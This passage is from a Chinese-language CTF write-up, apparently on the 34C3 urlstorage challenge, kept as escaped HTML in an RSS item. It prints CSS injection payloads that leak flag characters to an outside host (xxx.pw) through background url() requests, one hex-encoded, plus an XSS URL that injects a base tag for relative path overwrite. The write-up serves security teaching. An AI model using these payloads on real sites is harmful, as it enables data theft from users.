&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>匹配flag时的坑点在于css选择器在匹配的时候首字符不能是数字，而flag的开头为&lt;code>34c3&lt;/code>，所以使用css的模糊匹配&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">#&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">value&lt;/span>&lt;span style="color:#f92672">*=&lt;/span>&lt;span style="color:#f92672">C3_1&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://xxx.pw/?flag=C3_1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者16进制编码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">#&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">value&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">33&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">34&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">43&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">33&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://xxx.pw/?34c3&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后利用之前的xss点修改base标签进行rpo，获取flag&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.42.134:8080/flag?token=cdebcc090a8b4e339b876c33ad1c0acb%3C/title%3E%3Cbase%20href=urlstorage/123%3E
&lt;/code>&lt;/pre></description></item></channel></rss>